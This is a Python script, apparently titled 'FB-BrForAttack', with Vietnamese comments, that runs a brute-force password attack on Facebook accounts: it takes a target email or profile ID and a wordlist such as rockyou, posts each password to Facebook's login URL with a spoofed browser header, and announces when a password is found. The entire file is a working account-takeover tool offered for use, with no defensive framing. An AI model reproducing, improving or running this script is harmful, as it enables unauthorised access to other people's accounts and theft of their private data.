#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import time
import os
import optparse
import requests

# Kiểm tra kết nối Internet
server = "www.google.com"
def check():
    try:
        s = socket.gethostbyname(server)
        ss = socket.create_connection((s, 80), 2)
        return True
    except:
        pass
    return False

check = check()

# Tạo đối tượng phân tích các tùy chọn dòng lệnh
parse = optparse.OptionParser(r"""
Usage: python ./FB-BrForAttack.py -T [TARGET]<Email/ID> -W <Wordlist file>
-------------
OPTIONS:
       |
    |--------    
    | -t <target email> [OR] <FACEBOOK ID>        ::>   Set target Email [OR] Target Profile ID
    |--------
    | -w <word list file>                         ::>   Set Wordlist File 
-------------
Examples:
        |
     |--------
     | python FB-BrForAttack.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python FB-BrForAttack.py -t 100001013078780 -w C:\Users\Me\Desktop\wordlist.txt
     |--------

""")

# Kiểm tra kết nối Internet
if not check:
    print("\n[!] Error: Please Check Your Internet Connection !!!")
    exit(1)

# Lấy thông tin từ dòng lệnh
parse.add_option("-t", "--target", '-T', '--TARGET', dest="taremail", type="string",
                 help="target email !")
parse.add_option("-w", "--wordlist", '-W', '--WORDLIST', dest="wlst", type="string",
                 help="wordlist file !")
(options, args) = parse.parse_args()

if options.taremail and options.wlst:
    user = options.taremail
    passw = options.wlst

    try:
        passwfile = open(passw, "r")
    except IOError:
        print("\n[!] No Such File: " + passw + " !!!\n")
        exit(1)

    os.system("cls||clear")
    time.sleep(0.10)
    print("\n[*] website>: https://facebook.com ")
    time.sleep(0.10)

    if "@" in user:
        print("\n[+] Target Email>: " + str(user))
    else:
        print("\n[+] Target FB~ID>: " + str(user))

    time.sleep(0.10)
    print("\n[@] WordList>: " + str(passw))
    time.sleep(0.10)
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
    time.sleep(0.20)
    print("\n[$]--- Brute Force Attack Start ---[$]\n")
    time.sleep(0.8)

    session = requests.Session()  # Sử dụng session để duy trì cookies và trạng thái đăng nhập
    login_url = "https://www.facebook.com/login"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    lo = 1
    for password in passwfile:
        if not password.strip(): continue
        password = password.strip()

        payload = {
            'email': user,
            'pass': password
        }

        try:
            response = session.post(login_url, data=payload, headers=headers)

            # Kiểm tra nếu đăng nhập thành công (có thể cần thay đổi phương thức kiểm tra)
            if 'home_icon' in response.text:
                print(f"[+]~[{lo}] Testing Password[ {password} ]  ==> Yes :)")
                print("\n[*] Found! Password is ==> " + password)
                break
            else:
                print(f'[-]~[{lo}] Testing Password[ {password} ] ==> No :(')
                lo += 1

        except KeyboardInterrupt:
            print('\n---------------------------\n[!][CTRL+C] Exiting.....!\n')
            time.sleep(1.2)
            exit(1)

else:
    print(parse.usage)
    exit(1)

